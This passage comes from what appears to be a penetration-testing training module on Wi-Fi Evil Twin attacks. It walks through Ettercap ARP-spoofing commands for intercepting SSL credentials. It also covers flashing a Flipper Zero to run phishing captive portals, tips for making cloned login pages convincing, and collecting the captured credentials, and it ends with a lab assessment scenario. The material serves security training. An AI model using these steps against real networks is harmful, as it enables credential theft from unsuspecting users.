![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/0010.PNG)

* * *

### SSL Interception Using CLI

The same SSL interception attack can also be executed directly from the terminal using Ettercap's command-line interface (CLI).

```Usage
ettercap [OPTIONS] [TARGET1] [TARGET2]

```

| **Option** | **Description** |
| --- | --- |
| `-M <arg>` | perform a mitm attack |
| `-o` | don't sniff, only perform the mitm attack |
| `-b` | sniff packets destined to broadcast |
| `-T` | use text only GUI |
| `-q` | do not display packet contents |
| `-s` | issue these commands to the GUI |
| `-i` | use this network interface |
| `--certificate <file>` | certificate file to use for SSL MiTM |
| `--private-key <file>` | private key file to use for SSL MiTM |

We use the following command to perform the attack, specifying the desired options:

```shell
ettercap -T -q -M ARP -i wlan1

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
 wlan1 -> 02:00:00:00:02:00
	  192.168.0.1/255.255.255.0

Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...

```

In the above command, we used `-T` for text mode, `-q` for quiet mode to suppress packet content display, `-M ARP` to perform a MiTM attack using ARP spoofing and `-i` to select the wlan1 interface.

Once the sniffing is enabled, if clients visit an SSL-secured website and enter their credentials, those credentials will be captured in the Ettercap logs. However, the success of this technique relies on the client accepting a self-signed certificate when accessing the site.

```shell
Text only Interface activated...
Hit 'h' for inline help

HTTP : 192.168.0.195:443 -> USER: <SNIP>  PASS: <SNIP>  INFO: 192.168.0.195/received.php
CONTENT: username=<SNIP>&password=<SNIP>&submit=Sign+In

```


# Evil Portals using Flipper Zero

* * *

One of the easiest ways to launch an Evil Portal attack is using the highly portable [Flipper Zero](https://shop.flipperzero.one/) with the [genuine WiFi Dev Board](https://shop.flipperzero.one/products/wifi-devboard). The WiFi Dev Board, based on the ESP32-S2 module, connects to the Flipper Zero through the GPIO pins at the top, giving it WiFi connection capabilities, and expanding its potential into MKID capturing, de-authentication attacks, and more.

![Flipper Boxed](https://academy.hackthebox.com/storage/modules/291/15/S1S0.jpg)

**Disclaimer:**
This section will walk you through flashing the FlipperZero [Unleashed firmware](https://github.com/DarkFlippers/unleashed-firmware) and the WiFi Dev Board [Evil Portal firmware](https://github.com/bigbrodude6119/flipper-zero-evil-portal), as a method to avoid any inconsistency in configuration. The Unleashed firmware is a well-vetted, tried-and-true environment from which you can follow along with this section.

The Unleashed firmware is an _unlocked_ version of the Flipper Zero OEM firmware, implying that multiple regional and regulatory restrictions are lifted on it. Please read the [documentation](https://github.com/DarkFlippers/unleashed-firmware#whats-changed) and inform yourself of the risks inherent to your specific country before using any of the unlocked capabilities of your Flipper Zero. This is an educational tool and should only be used to this extent.

* * *

# Preparation

## Flashing the Unleashed firmware on the Flipper Zero

Navigate to the [Releases page](https://github.com/DarkFlippers/unleashed-firmware/releases/) of the Flipper Zero Unleashed repository and download the latest firmware ( `.tgz` format). At the time of writing, this is `flipper-z-f7-update-unlshd-079e.tgz`.

The letters at the end of each version stand for specific types of pre-loaded applications:

- Default - `no letter`
- Extra apps - `e`
- No apps - `c`
- RGB mod patch - `r`

In our case, we are downloading the firmware with extra apps, to shorten the configuration time. The extra apps pack will contain the ESP32-S2 applications for the Flipper Zero that will allow us to interface with the WiFi Dev Board.

![Flipper Firmware](https://academy.hackthebox.com/storage/modules/291/15/S1S1.png)

To upload and apply the firmware you've just downloaded, you have several options:

- Using the [qFlipper software](https://github.com/DarkFlippers/unleashed-firmware/blob/dev/documentation/HowToInstall.md#with-qflipper-120)
- Using the [web updater](https://github.com/DarkFlippers/unleashed-firmware/blob/dev/documentation/HowToInstall.md#with-web-updater)
- Using the [iOS mobile app](https://github.com/DarkFlippers/unleashed-firmware/blob/dev/documentation/HowToInstall.md#with-ios-mobile-app)
- Using the [Android mobile app](https://github.com/DarkFlippers/unleashed-firmware/blob/dev/documentation/HowToInstall.md#with-android-mobile-app-with-tgz-download)
- Manually from the Flipper Zero's [storage SD card](https://github.com/DarkFlippers/unleashed-firmware/blob/dev/documentation/HowToInstall.md#with-offline-update-on-flipper)

* * *

## Optional: Removing installed firmware from the WiFi Dev Board

If you've been using the WiFi Dev Board for some time, and have already flashed a different firmware on it, you will need to remove it before installing the Evil Portal release. Follow the commands below to wipe the ESP32-S2 chip and start with a clean slate.

```shell
pip3 install esptool

pip3 install setuptools

```

Once the two modules have been installed, it's time to connect the WiFi Dev Board to your computer. First, hold the BOOT button down, connect the board to your computer while holding the button down for 3-4 more seconds, then release. This will put the board into firmware flashing mode.

You can then issue the following command to erase the currently installed firmware:

```shell
python3 -m esptool –chip esp32s2 erase_flash

```

Ensure the command runs successfully, then proceed to the next step.

* * *

## Flashing the Evil Portal firmware on the WiFi Dev Board

The next step is flashing the appropriate firmware on the WiFi Dev Board as well. The board comes with a USB-C port that will facilitate this. Please note that the board should be disconnected from both your computer and the Flipper Zero at this time.

Before we start, download the latest firmware version from the [Releases page](https://github.com/bigbrodude6119/flipper-zero-evil-portal/releases) of the Evil Portal repository. The firmware file you need is the `wifi_dev_board.zip` archive, which will contain 4 `.bin` files. Extract these out of the archive and have them easily accessible.

![WiFi Board Firmware](https://academy.hackthebox.com/storage/modules/291/15/S1S2.png)

Once the four `.bin` files have been extracted, it's time to connect the WiFi Dev Board to your computer. First, hold the BOOT button down, connect the board to your computer while holding the button down for 3-4 more seconds, then release. This will put the board into firmware flashing mode.

Visit [this website](https://esp.huhn.me/) and hit the Connect button. You will see a pop-up from your browser, prompting you to select the interface you want to connect to. The ESP32-S2 SoC should appear on the list and you can select it and hit the Connect button on the pop-up. If it does not, you haven't booted correctly into firmware flashing mode, and you should repeat the steps above, or seek further support from the team.

![Firmware Flashing](https://academy.hackthebox.com/storage/modules/291/15/S1S3.png)

Once connected to the ESP32-S2, upload the four `.bin` files and make sure the following memory addresses are assigned to each. When ready, press the Program button.

- `0x1000` \- `EvilPortal.ino.bootloader.bin`
- `0x8000` \- `EvilPortal.ino.partitions.bin`
- `0xe000` \- `boot_app0.bin`
- `0x10000` \- `EvilPortal.ino.bin`

The `.bin` files will be flashed to the ESP32-S2 and you will observe a successful "Done!" message at the end of the output. If this is the case, you may disconnect your WiFi Dev Board from your computer and set it aside for a moment.

![Firmware Memory Addressing](https://academy.hackthebox.com/storage/modules/291/15/S1S4.png)

* * *

## Optional: Installing the Evil Portal app on Flipper Zero

The Evil Portal app is found under: `Apps > GPIO > [ESP32] Evil Portal`. In this module, we are running version `0.0.2`, which can be confirmed under the `Help` menu inside the app.

If you haven't chosen the Unleashed firmware version containing all of the extra apps ( `flipper-z-f7-update-unlshd-###e.tgz`), or if the Evil Portal app is somehow absent from your Flipper Zero, you will need to follow these steps. The app is required to interface with the WiFi Dev Board firmware.

You can simply download the app from the same [Releases page](https://github.com/bigbrodude6119/flipper-zero-evil-portal/releases) as the firmware. The file you are looking to download is the `unleashed-evil_portal.fap.zip` file. Once downloaded, you will need to unzip it on your computer, then copy it over to your Flipper Zero SD card under the location `SD Card/apps/GPIO/evil_portal.fap`.

Please note that this `.fap` file is built specifically for the Unleashed firmware. It will not work if you are using the official Release version of the Flipper Zero firmware. If you are on a different firmware you can download the `evil_portal.fap` file at [flipc.org](https://flipc.org/bigbrodude6119/flipper-zero-evil-portal?branch=main&root=flipper/flipper-evil-portal&firmware=unleashed) or you can build the `.fap` file yourself by following [these instructions](https://github.com/flipperdevices/flipperzero-firmware/blob/dev/documentation/AppsOnSDCard.md).

You can use the [qFlipper's](https://flipperzero.one/update) interface to upload directly into the directory above by right-clicking any space in the directory, selecting "Upload here...", and picking the `.fap` file from your computer.

![Application Upload](https://academy.hackthebox.com/storage/modules/291/15/S1S5.png)

* * *

## Configuring the Evil Portal

As a last step, download the Evil Portal app resources folder from the same [Releases page](https://github.com/bigbrodude6119/flipper-zero-evil-portal/releases). The file `evil_portal_sd_folder.zip` will contain the `index.html` page used by the app to start the captive portal. As the name suggests, the contents of this archive also go on Flipper Zero's SD card storage: `SD Card/apps_data/evil_portal`.

If the folder is not present, create it using the right-click menu on `qFlipper`.

![App Data Creation](https://academy.hackthebox.com/storage/modules/291/15/S1S6.png)

Then, copy over the `ap.config.txt` and `index.html` files and make sure the `logs` folder is created as well.

![App Data View](https://academy.hackthebox.com/storage/modules/291/15/S1S7.png)

Clones of popular captive portals that you can use to test out the app for the first time can be also found under the [community portals](https://github.com/bigbrodude6119/flipper-zero-evil-portal/tree/main/portals) directory of the same repository. Once downloaded, select one, rename it to `index.html`, and delete the old one present in the SD card folder mentioned above, before uploading the new one. There can only be one `index.html` file, but you can also rename them on the fly using Flipper Zero's built-in file manager app.

![Index Deletion](https://academy.hackthebox.com/storage/modules/291/15/S1S8.gif)

* * *

# Launching the Evil Portal

Once set-up is complete, you can launch the app from your Flipper Zero with the WiFi Dev Board attached. The LED on the Flipper Zero will turn `GREEN` when the portal is running. You can choose to set the name of the Access Point (AP) from the app before starting the portal.

![Flipper Unboxed](https://academy.hackthebox.com/storage/modules/291/15/S1S9.jpg)

The LED colour on the WiFi Dev Board will give you hints towards the operational status of the device:

- `BLUE` \- Standing by
- `GREEN` \- Running portal
- `RED` \- Error

![Portal Configuration](https://academy.hackthebox.com/storage/modules/291/15/S1S10.gif)

The `Set AP Name` function should contain a name appropriate for the chosen captive portal HTML code. If you are trying to mimic a Google Sign-In page, ensure the name of the AP itself is appropriate for the scenario. Otherwise, users might clue in that this is a malicious network.

![Set AP Name](https://academy.hackthebox.com/storage/modules/291/15/S1S11.png)

Connecting to the network from any device will prompt the captive portal to pop up. Depending on the quality of the clone, the user might be convinced to enter their credentials. Hitting the "Next" button will not allow them to proceed to the Internet, however. Their connection will still be blocked (mainly because the Flipper Zero can not handle doubling up as a router and forwarding all the client's traffic to the Internet), and they will simply be presented with the form again. This might raise suspicion and cause the target to disconnect from the network immediately, rendering this an ineffective way of completing a social engineering attack.

![Evil Portal Interaction](https://academy.hackthebox.com/storage/modules/291/15/S1S12.gif)

Regardless, in the field, you might encounter valid submissions from unaware targets. Should they have submitted anything, it will show up both on the screen of the Flipper Zero and in the logs.

![Log View](https://academy.hackthebox.com/storage/modules/291/15/S1S13.png)

Ensure you save the logs afterwards to retain any captured data presented on the Flipper Zero screen. This can be done by pressing the `Back` button while the portal is running, and clicking the `Save logs` option in the app.

![Log Save](https://academy.hackthebox.com/storage/modules/291/15/S1S14.gif)

Before launching Evil Portal attacks, you must make sure to use the appropriate HTML code for the devices you are trying to target. Legitimate captive portals adapt to the aspect ratio of the device screens they are being loaded into, so utilizing mobile-specific captive portals against desktop devices will result in a low rate of credulity from the targets.

You also need to make sure that the popular, legitimate captive portal you are trying to convince targets to log into is the most up-to-date version. If you decide to use any of the portals from the Flipper Zero community, keep in mind they might be out-of-date designs of the real versions.

As you can see, currently, the Google sign-in page looks vastly different from the example we used before:

![Current Google Login](https://academy.hackthebox.com/storage/modules/291/15/S1S15.png)

* * *

# Cloning other portals

When cloning your own portal, it's important to note that large or complex web pages can cause Flipper Zero to run out of memory and crash. During testing, pages around a few kilobytes worked best, while those larger than 50 MB consistently caused crashes. When attempting to save the HTML code from the new `accounts.google.com` page for our Flipper Zero Evil Portal app, we encountered this exact issue.

![Flipper Crash](https://academy.hackthebox.com/storage/modules/291/15/S1S16.png)

Instead, we recommend you aim for captive portals that are more realistically used in the wild and whose HTML code is smaller in size, unlike the Google SSO login captive portal. We recommend you also keep a copy of the Flipper Zero `SD Card/apps_data/evil_portal` folder on your computer for on-the-fly modifications of the `index.html` and `ap.config.txt` files.

Commit to an exercise that you can easily stick to. When you travel and are met with a captive portal, whether it's a hotel, a public WiFi in the city you are visiting, a coffee shop, or anything else, try to clone it and save it in a repository for yourself or the community. Small contributions like this not only help grow the toolset you employ but also maintain your red-teaming mentality throughout your free time.

In the following table, we have included links to high-quality repositories containing `Evil Portal` HTML templates. Please use these as needed. We also encourage you to build your collection and exercise your knowledge in cloning websites to raise awareness of this attack vector.

| **Link** | **Description** |
| --- | --- |
| [Evil Portals](https://github.com/kleo/evilportals) | Collection of portals that can be loaded into the `Evil Portal` module. |
| [Red Portals](https://github.com/CodyTolene/Red-Portals?tab=readme-ov-file) | Some of the most common and realistic `Evil Portals`. |
| [Community Portals](https://github.com/bigbrodude6119/flipper-zero-evil-portal/tree/main/portals) | Community-built `Evil Portals` |
| [FlipperZeroEuropeanPortals](https://github.com/FlippieHacks/FlipperZeroEuropeanPortals) | Over 60 portals highlighting airlines, hotels, and railway services across `Europe`. |
| [Extra phishing pages](https://github.com/wifiphisher/extra-phishing-pages) | Community-built phishing scenarios for `Wifiphisher`. |

* * *

# Loot gathering

When you are finished running the attack, ensure you hit the `Stop portal` button, and wait for the status LED on the WiFi Dev Board to turn `BLUE`. Ensure one more time that you also click the `Save logs` button to retain all the saved credentials.

You may now disconnect the WiFi Dev Board from the Flipper Zero, and connect the latter to your computer for log collection. Using the qFlipper, navigate to `SD Card/apps_data/evil_potal/logs/` and download all of the logs by right-clicking on them and selecting `Download`. These logs will contain any of the information inputted by the targets into the Evil Portal during its operation.

![Log Download](https://academy.hackthebox.com/storage/modules/291/15/S1S17.png)

* * *

## Closing Thoughts

Attacking Wi-Fi networks using Rogue Access Points or Evil Twins is a crucial skill for evaluating the security posture of clients and employees against social engineering attacks. The Evil Twin attack remains a powerful vector for compromising Wi-Fi networks, even as protocols like WPA3 and WPA-Enterprise continue to evolve. By leveraging rogue access points, captive portals, and advanced MiTM strategies, attackers can deceive clients and harvest sensitive credentials. Understanding these attack methods is critical not only for offensive security assessments but also for reinforcing defenses. Security professionals must stay vigilant against these evolving threats to better protect networks and educate users on safe Wi-Fi practices.

As attackers evolve, so must defenders. Training employees against such attacks, enforcing certificate validation for enterprise networks, and regularly auditing Wi-Fi networks with wireless IDS such as [Nzyme](https://www.nzyme.org/) are essential steps to mitigate these threats. By understanding how Evil Twin attacks work, we become better equipped to defend against them and build more resilient wireless infrastructures. Continuous learning and proactive defense strategies are vital in staying ahead of evolving attack vectors, ensuring secure and reliable wireless environments.


# Wi-Fi Evil Twin Attacks - Skills Assessment

* * *

## Scenario

* * *

`PulseGrid Systems`, specializing in real-time monitoring and control of critical infrastructure, has hired you to conduct a penetration test on their Wi-Fi network. They are confident in their wireless security and believe they are secure. Your task is to identify vulnerabilities, including social engineering attacks, that could expose critical data or internal systems to unauthorized access. This assessment will evaluate whether their systems are properly configured and their employees are trained to resist social engineering attempts, ensuring that PulseGrid System's Wi-Fi infrastructure remains resilient against potential threats while safeguarding the privacy and security of their critical operations.

Harness the Wi-Fi attack techniques you learned in this module to disclose all security vulnerabilities.

* * *

## In-Scope Targets

| **SSID** | **Description** |
| --- | --- |
| `PulseGrid` | `PulseGrid main SSID for network access` |
| `PulseGrid-INT` | `PulseGrid Internal Network` |
| `PulseGrid-ENT` | `PulseGrid Enterprise Network` |

* * *

Note: Please wait for 2 minutes after the target spawns before connecting.

* * *

Apply the skills learned in this module to compromise all Wi-Fi networks present in the client environment and submit the relevant flags to complete the skills assessment.


